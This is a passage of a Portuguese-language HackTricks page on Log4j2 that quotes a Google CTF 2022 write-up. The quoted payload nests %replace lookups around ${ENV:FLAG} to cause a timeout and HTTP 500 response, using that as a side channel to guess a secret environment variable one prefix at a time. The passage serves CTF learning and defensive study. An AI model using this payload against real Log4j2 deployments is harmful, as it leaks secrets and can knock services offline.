Neste [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), em vez de usar um ataque ReDoS, foi utilizado um **ataque de amplifica√ß√£o** para causar uma diferen√ßa de tempo na resposta:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Se a flag come√ßar com `flagGuess`, toda a flag √© substitu√≠da por 29 `#`-s (usei esse caractere porque provavelmente n√£o faria parte da flag). **Cada um dos 29 `#`-s resultantes √© ent√£o substitu√≠do por 54 `#`-s**. Esse processo √© repetido **6 vezes**, levando a um total de ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-s!**
>
> Substituir tantos `#`-s acionar√° o timeout de 10 segundos da aplica√ß√£o Flask, o que, por sua vez, resultar√° no c√≥digo de status HTTP 500 sendo enviado ao usu√°rio. (Se a flag n√£o come√ßar com `flagGuess`, receberemos um c√≥digo de status diferente de 500)

## Refer√™ncias

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
